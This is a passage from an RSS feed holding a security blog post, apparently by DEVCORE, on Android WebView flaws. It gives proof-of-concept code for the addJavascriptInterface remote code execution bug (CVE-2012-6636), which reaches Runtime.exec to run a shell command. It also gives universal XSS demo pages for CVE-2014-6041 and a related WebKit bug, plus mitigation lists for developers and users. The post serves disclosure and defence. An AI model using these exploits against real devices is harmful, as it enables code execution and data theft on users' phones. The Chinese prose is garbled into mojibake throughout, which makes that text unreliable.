                <link>https://devco.re/blog/2015/01/09/information-security-insight-kham/</link>
                <guid>https://devco.re/blog/2015/01/09/information-security-insight-kham</guid>
                <pubDate>Fri, 09 Jan 2015 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Android WebView ç‚ºä½ çš„ä½¿ç”¨è€…æ‰“é–‹äº†æ¼æ´ä¹‹é–€ä½ çŸ¥é“å—ï¼Ÿ</title>
                <description>&lt;p&gt;ç‚ºäº†è§£æ±ºåœ¨æ‡‰ç”¨ç¨‹å¼ä¸­é¡¯ç¤ºç¶²é çš„éœ€æ±‚ï¼Œé–‹ç™¼è€…ä¸€èˆ¬æœƒä½¿ç”¨åˆ°ç”±ç³»çµ±æä¾›çš„ WebView å…ƒä»¶ã€‚è€Œç”±æ–¼ JavaScript è¢«å»£æ³›æ‡‰ç”¨åœ¨ç¶²é ä¸Šï¼Œé–‹ç™¼è€…é€šå¸¸ä¹ŸæœƒæŠŠ WebView è™•ç† JavaScript çš„åŠŸèƒ½æ‰“é–‹ï¼Œå¥½è®“å¤§éƒ¨åˆ†ç¶²é èƒ½æ­£å¸¸é‹ä½œã€‚ä½†å°±åœ¨é–‹å•Ÿé€™å€‹åƒæ˜¯å¿…ä¸å¯å°‘çš„ JavaScript åŠŸèƒ½æ™‚ï¼ŒèƒŒå¾Œä¸€äº›ç”±æ–¼ç³»çµ±æ¼æ´è€Œå¼•ç™¼å‡ºä¾†æ„æƒ³ä¸åˆ°çš„é¢¨éšªå»æœ‰æ©Ÿæœƒç”±æ­¤è€Œç”Ÿã€‚æ¥ä¸‹ä¾†çš„éƒ¨åˆ†å°‡æŠŠé€™äº›æ¼æ´ç‚ºå¤§å®¶åšå€‹æ•´ç†ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ç›¸é—œæ¼æ´&quot;&gt;ç›¸é—œæ¼æ´&lt;/h3&gt;

&lt;h4 id=&quot;1-é ç«¯ä»£ç¢¼åŸ·è¡Œ-remote-code-execution&quot;&gt;1. é ç«¯ä»£ç¢¼åŸ·è¡Œ (Remote Code Execution)&lt;/h4&gt;

&lt;h5 id=&quot;é¢¨éšªæœ¨é¦¬è·³æ¿å€‹è³‡è¢«ç›œ&quot;&gt;é¢¨éšªï¼šæœ¨é¦¬è·³æ¿ï¼Œå€‹è³‡è¢«ç›œ&lt;/h5&gt;
&lt;p&gt;ç›®å‰æœ‰æ©Ÿæœƒç™¼ç”Ÿ RCE é¢¨éšªéƒ½åœç¹åœ¨ &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; é€™å€‹åŠŸèƒ½ä¸Šï¼Œè©²åŠŸèƒ½åŸæ„æ˜¯ç‚ºè¢«è¼‰å…¥çš„ç¶²é å’ŒåŸç”Ÿç¨‹å¼é–“å»ºç«‹ä¸€å€‹â€æ©‹æ¨‘â€ï¼Œé€šéé å…ˆè¨­å®šå¥½çš„ä»‹é¢ï¼Œè®“ç¶²é èƒ½å‘¼å«æŒ‡å®šçš„å…¬é–‹å‡½å¼ä¸¦å–å¾—å‡½å¼å›å‚³çš„çµæœã€‚&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JsObject&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;Hello World&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;webView&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSettings&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setJavaScriptEnabled&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;webView&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;addJavascriptInterface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JsObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;injectedObject&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;webView&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadUrl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://www.example.com/&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;â€¦
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
       &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;injectedObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// return &amp;quot;Hello World&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;â€¦&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;åƒä¸Šé¢çš„ä¾‹å­è£¡ï¼Œç¶²é èƒ½é€šéé å…ˆè¨­å®šå¥½çš„ â€œinjectedObjectâ€ ä»‹é¢ï¼Œå‘¼å« â€œtoStringâ€ å‡½å¼ï¼Œå¾—åˆ° â€œHello Worldâ€ é€™å€‹å­—ä¸²ã€‚&lt;/p&gt;

&lt;p&gt;å…¶æ¼æ´ &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-6636&quot;&gt;CVE-2012-6636&lt;/a&gt; æœ€æ—©åœ¨2012å¹´12æœˆè¢«&lt;a href=&quot;http://50.56.33.56/blog/?p=314&quot;&gt;å…¬ä½ˆ&lt;/a&gt;å‡ºä¾†ï¼Œæ”»æ“Šè€…æœ‰æ©Ÿæœƒåˆ©ç”¨ä»–é€šé Java Reflection API ä¾†åŸ·è¡Œä»»æ„ä»£ç¢¼ã€‚å½±éŸ¿ Android 1.X ~ 4.1ã€‚&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmdArgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;injectedObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;java.lang.Runtime&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                              &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;getRuntime&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                              &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cmdArgs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/system/bin/sh&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;-c&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;cat vuln &amp;gt;&amp;gt; attacker.txt&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;å…¶å¾Œ Google åœ¨ Android 4.2 é–‹å§‹å° &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; çš„ä½¿ç”¨æ–¹å¼åŠ äº†é™åˆ¶ï¼Œä½¿ç”¨æ™‚éœ€è¦åœ¨ Java ç«¯æŠŠå¯è¢«ç¶²é åŸ·è¡Œçš„å…¬é–‹å‡½å¼é€é @JavascriptInterface ä¾†æ¨™è¨»ã€‚ä¸¦å¥‰å‹¸é–‹ç™¼è€…åˆ¥åœ¨ 4.1 æˆ–ä¹‹å‰çš„ç³»çµ±ä¸Šä½¿ç”¨ &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;p&gt;å¯æ˜¯æ˜¯å¦é–‹ç™¼è€…åªè¦åœ¨å—å½±éŸ¿çš„ç³»çµ±ä¸Šä¸ä¸»å‹•ä½¿ç”¨ &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; å°±èƒ½è§£æ±ºå•é¡Œå‘¢ï¼Ÿç­”æ¡ˆæ˜¯å¦å®šçš„ã€‚&lt;/p&gt;

&lt;p&gt;åœ¨ Android 3.X ~ 4.1 ä¸Šï¼ŒWebView é è¨­æœƒç”¨ &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt; æ·»åŠ ä¸€å€‹å« â€œsearchBoxJavaBridge_â€ çš„ä»‹é¢ã€‚é–‹ç™¼è€…å¦‚æœæ²’æœ‰æ³¨æ„çš„è©±å°±æœƒåŒæ¨£æœƒè®“ä½¿ç”¨è€…é™·å…¥é¢¨éšªä¸­ã€‚å¾ˆå·§åˆåœ°ï¼Œå¾ Android 3.0 é–‹å§‹ Google åŠ å…¥äº† &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#removeJavascriptInterface(java.lang.String)&quot;&gt;removeJavascriptInterface&lt;/a&gt; å‡½å¼è®“é–‹ç™¼è€…å¯ä»¥ç§»å®šæŒ‡å®šçš„ä»‹é¢ã€‚æ‰€ä»¥é–‹ç™¼è€…å¯ä»¥ä½¿ç”¨è©²å‡½å¼åœ¨å—å½±éŸ¿çš„ç³»çµ±ä¸ŠæŠŠ â€œsearchBoxJavaBridge_â€ ç§»é™¤ã€‚&lt;/p&gt;

&lt;p&gt;é™¤äº† â€œsearchBoxJavaBridge_â€ å¤–ï¼Œé‚„æœ‰å…©å€‹ä»‹é¢æœƒåœ¨ç‰¹å®šæƒ…æ³ä¸‹è¢«åŠ åˆ° WebView ä¸­ã€‚è‹¥ä½¿ç”¨è€…æœ‰åœ¨æ‰‹æ©Ÿä¸Š [ç³»çµ±è¨­å®š] è£¡çš„ [å”åŠ©å·¥å…·]ï¼Œæ‰“é–‹ [æœå‹™] å­åˆ†é¡ä¸­çš„ä»»ä½•ä¸€å€‹é …ç›®ï¼Œç³»çµ±å°±æœƒå°å…¶å¾Œå»ºç«‹çš„ WebView è‡ªå‹•åŠ ä¸Š â€œaccessibilityâ€ å’Œ â€œaccessibilityTraversalâ€é€™å…©å€‹ä»‹é¢ã€‚é€™è¡Œç‚ºåœ¨ Android 4.4 ç”±æ–¼&lt;a href=&quot;https://android.googlesource.com/platform/frameworks/base/+/94c0057d67c2e0a4b88a4f735388639210260d0e&quot;&gt;èˆŠç‰ˆ WebView è¢«å–ä»£&lt;/a&gt;è€Œæ¶ˆå¤±äº†ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20141013/android_accessibility_service.png&quot; alt=&quot;Android å”åŠ©å·¥å…·æœå‹™&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;é˜²ç¯„&quot;&gt;é˜²ç¯„&lt;/h4&gt;

&lt;p&gt;ä½œç‚ºé–‹ç™¼è€…&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å¦‚ééœ€è¦ï¼Œé—œé–‰ JavaScript åŠŸèƒ½ (é è¨­é—œé–‰)&lt;/li&gt;
  &lt;li&gt;å¯è€ƒæ…®æŠŠç¶²é ç•¶ä½œç¯„æœ¬å„²å­˜åœ¨æ‡‰ç”¨å…§ï¼Œå†ç”¨å…¶ä»–é€”å¾‘è¼‰å…¥è³‡æ–™&lt;/li&gt;
  &lt;li&gt;åœ¨æœ‰é¢¨éšªçš„ç³»çµ±ä¸­åœç”¨ &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)&quot;&gt;addJavascriptInterface&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;åœ¨æœ‰é¢¨éšªçš„ç³»çµ±ä¸­ä½¿ç”¨ &lt;a href=&quot;http://developer.android.com/reference/android/webkit/WebView.html#removeJavascriptInterface(java.lang.String)&quot;&gt;removeJavascriptInterface&lt;/a&gt; ç§»é™¤ç³»çµ±è‡ªå¸¶çš„ä»‹é¢&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä½œç‚ºä½¿ç”¨è€…&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å¦‚ééœ€è¦ï¼Œé—œé–‰ [ä¸æ˜çš„ä¾†æº] é¸é … (é è¨­é—œé–‰)&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨ Android 4.2 æˆ–ä»¥ä¸Šä¸å—å½±éŸ¿çš„ç³»çµ±&lt;/li&gt;
  &lt;li&gt;å‹¿åœ¨å—å½±éŸ¿çš„ç³»çµ±ä¸Šä½¿ç”¨æ©Ÿæ•æœå‹™æˆ–å„²å­˜æ©Ÿæ•è³‡æ–™&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20141013/android_unknown_source.png&quot; alt=&quot;Android ä¸æ˜çš„ä¾†æº&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;2-ç¹éåŒæºç­–ç•¥-same-origin-policy-bypass&quot;&gt;2. ç¹éåŒæºç­–ç•¥ (Same-Origin Policy bypass)&lt;/h4&gt;

&lt;h5 id=&quot;é¢¨éšªå€‹è³‡è¢«ç›œ&quot;&gt;é¢¨éšªï¼šå€‹è³‡è¢«ç›œ&lt;/h5&gt;
&lt;p&gt;ç‚ºé˜²æ­¢ç¶²é åœ¨è¼‰å…¥å¤–éƒ¨è³‡æºæ™‚å¼•ç™¼å®‰å…¨å•é¡Œï¼Œç€è¦½å™¨æœƒå¯¦ä½œ&lt;a href=&quot;https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Same_origin_policy_for_JavaScript&quot;&gt;åŒæºç­–ç•¥&lt;/a&gt;ä»¥é™åˆ¶ç¨‹å¼ç¢¼å’Œä¸åŒç¶²åŸŸè³‡æºé–“çš„äº’å‹•ã€‚&lt;/p&gt;

&lt;p&gt;å…¶ä¸­ &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6041&quot;&gt;CVE-2014-6041&lt;/a&gt; æ¼æ´ï¼Œé€šéç¨‹å¼åœ¨è™•ç† \u0000 (unicode null byte) æ™‚çš„å¤±èª¤è€Œç¹éäº†åŸæœ‰çš„é™åˆ¶ã€‚&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;CVE-2014-6041 UXSS DEMO&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;iframe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;target_frame&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;http://devco.re/&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;button&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;go&amp;quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onclick=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;window.open(&amp;#39;\u0000javascript:alert(document.domain)&amp;#39;,&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&amp;#39;target_frame&amp;#39;)&amp;quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;å¦‚æœä¸Šé¢çš„ç¶²é æ˜¯æ”¾ç½®åœ¨èˆ‡ &lt;a href=&quot;http://devco.re/&quot;&gt;http://devco.re/&lt;/a&gt; ä¸åŒæºçš„åœ°æ–¹ï¼Œæ­£å¸¸ä¾†èªªé»æ“ŠæŒ‰éˆ•å¾Œæœƒå› ç‚º SOP çš„é—œä¿‚ï¼Œè©²æ®µ JavaScript ç„¡æ³•åŸ·è¡Œè€Œä¸æœƒæœ‰åæ‡‰ã€‚ä½†åœ¨å—å½±éŸ¿çš„ç’°å¢ƒè£¡å‰‡èƒ½é †åˆ©åŸ·è¡Œä¸¦è·³å‡º â€œdevco.reâ€ é€™å€‹ç¶²åŸŸåç¨±ã€‚&lt;/p&gt;

&lt;p&gt;ä¸Šè¿°å•é¡Œè¢«ç™¼ç¾å¾Œæ²’å¤šä¹…ï¼Œå†ç”±ç›¸åŒç ”ç©¶å“¡ç™¼ç¾ä¸€å€‹æ—©åœ¨å¤šå¹´å‰å·²ç¶“è¢«ä¿®æ­£çš„ &lt;a href=&quot;http://trac.webkit.org/changeset/96826&quot;&gt;WebKit è‡­èŸ²&lt;/a&gt;ä»ç„¶å‡ºç¾åœ¨ Android 4.3 åŠä¹‹å‰çš„ç‰ˆæœ¬ä¸Šã€‚&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;object&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;http://www.bing.com&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;javascript:alert(document.domain)&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;foobar&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;ä¸Šè¿°çš„è·¨ä¾†æºæ“ä½œåŒæ¨£é•åäº† SOPï¼Œæ‡‰ç•¶è¢«æ‹’çµ•åŸ·è¡Œã€‚ä½†ä»–å»èƒ½åœ¨æœ‰é¢¨éšªçš„ WebView ä¸Šè¢«åŸ·è¡Œï¼Œé€ æˆé¢¨éšªã€‚&lt;/p&gt;

&lt;h4 id=&quot;é˜²ç¯„-1&quot;&gt;é˜²ç¯„&lt;/h4&gt;

&lt;p&gt;ä½œç‚ºé–‹ç™¼è€…&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å¦‚ééœ€è¦ï¼Œé—œé–‰ JavaScript åŠŸèƒ½ (é è¨­é—œé–‰)&lt;/li&gt;
  &lt;li&gt;å¯è€ƒæ…®æŠŠç¶²é ç•¶ä½œç¯„æœ¬å„²å­˜åœ¨æ‡‰ç”¨å…§ï¼Œå†ç”¨å…¶ä»–é€”å¾‘è¼‰å…¥è³‡æ–™&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä½œç‚ºä½¿ç”¨è€…&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;å¦‚ééœ€è¦ï¼Œé—œé–‰ [ä¸æ˜çš„ä¾†æº] é¸é … (é è¨­é—œé–‰)&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨ Android 4.4 æˆ–ä»¥ä¸Šä¸å—å½±éŸ¿çš„ç³»çµ±&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;çµèª&quot;&gt;çµèª&lt;/h3&gt;

